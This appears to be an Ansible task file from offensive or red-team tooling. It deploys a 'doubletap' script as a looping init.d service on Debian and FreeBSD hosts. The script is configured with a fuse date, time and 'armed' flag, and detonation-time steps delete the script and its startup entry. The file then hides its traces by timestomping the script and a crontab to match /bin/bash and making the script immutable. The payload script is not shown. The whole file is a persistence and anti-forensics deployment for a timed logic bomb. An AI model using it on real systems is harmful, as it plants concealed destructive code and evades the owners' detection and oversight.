---
#- name: Define variables for paths and filenames
#  set_fact:
#    doubletap_sh_loop_script_path: "/bin/doubletap2"
#    doubletap_sh_loop_service_name: "Doubletap"

- name: Copy shell script to target system
  copy:
    src: "files/doubletap.sh"
    dest: "{{ doubletap_sh_loop_script_path }}"
    owner: root
    group: root
    mode: '0755'

- name: Modify script to add while loop
  lineinfile:
    path: "{{ doubletap_sh_loop_script_path }}"
    line: |
      while true; do
    insertafter: "# Start of loop"

- name: Modify script to end while loop
  lineinfile:
    path: "{{ doubletap_sh_loop_script_path }}"
    line: |
        sleep 60
      done
    insertafter: "# End of loop"

- name: Create init.d startup script
  copy:
    dest: "/etc/init.d/{{ doubletap_sh_loop_service_name }}"
    mode: "0755"
    content: |
      #!/bin/sh
      ### BEGIN INIT INFO
      # Provides:          {{ doubletap_sh_loop_service_name }}
      # Required-Start:    $network $remote_fs
      # Required-Stop:     $network $remote_fs
      # Default-Start:     2 3 4 5
      # Default-Stop:      0 1 6
      # Short-Description: Starts the daemon
      ### END INIT INFO

      case "$1" in
        start)
          echo "Starting {{ doubletap_sh_loop_service_name }}"
          nohup {{ doubletap_sh_loop_script_path }} &> /dev/null &
          ;;
        stop)
          echo "Stopping {{ doubletap_sh_loop_service_name }}"
          pkill -f "{{ doubletap_sh_loop_script_path }}"
          ;;
        restart)
          $0 stop
          $0 start
          ;;
        *)
          echo "Usage: $0 {start|stop|restart}"
          exit 1
      esac

      exit 0

- name: Enable service on boot (Ubuntu)
  command: update-rc.d {{ doubletap_sh_loop_service_name }} defaults
  when: ansible_os_family == "Debian"

- name: Enable service on boot (FreeBSD)
  lineinfile:
    path: "/etc/rc.conf"
    line: "{{ doubletap_sh_loop_service_name }}_enable=\"YES\""
  when: ansible_os_family == "FreeBSD"

- name: Start the service
  command: "/etc/init.d/{{ doubletap_sh_loop_service_name }} start"

- name: Update settings in the script file
  replace:
    path: "{{ doubletap_sh_loop_script_path }}"
    regexp: |
      ^(fuse_date=).*|^(fuse_time=).*|^(fuse_armed=).*|^(log_location=).*|
    replace: |
      fuse_date="{{ doubletap_fuse_date }}" # In format YYYY-MM-DD in America/New_York timezone
      fuse_time="{{ doubletap_fuse_time }}" # In format HH:MM:SS, using 24h time in America/New_York timezone
      fuse_armed="{{ doubletap_fuse_armed }}" # DO NOT SET THIS TO TRUE UNLESS YOU WANT TO EXPLODE
      log_location="{{ doubletap_sh_loop_log_path }}" # Set to /dev/null for no output (and comment out line 14)
  
- name: Add command to delete the script after execution
  lineinfile:
    path: "{{ doubletap_sh_loop_script_path }}"
    line: "rm -f {{ doubletap_sh_loop_script_path }}"
    insertafter: "# Cleanup after explosion"

- name: Add script removal from startup task to the script
  lineinfile:
    path: "{{ doubletap_sh_loop_script_path }}"
    line: "update-rc.d -f {{ doubletap_sh_loop_service_name }} remove"
    insertafter: "# Detonation"

- name: Remove init.d script after execution (cleanup)
  lineinfile:
    path: "{{ doubletap_sh_loop_script_path }}"
    line: "rm -f /etc/init.d/{{ doubletap_sh_loop_service_name }}"
    insertafter: "# Detonation"

- name: Timestomp the crontab file
  command: touch -r /bin/bash /var/spool/cron/crontabs/{{ cron_job_user }}

- name: Timestomp script to match /bin/bash creation time
  command: touch -r /bin/bash {{ doubletap_sh_loop_script_path }}

# TODO check that this should go after timestomp
- name: Set immutable attribute on script
  command: "chattr +i {{ doubletap_sh_loop_script_path }}"
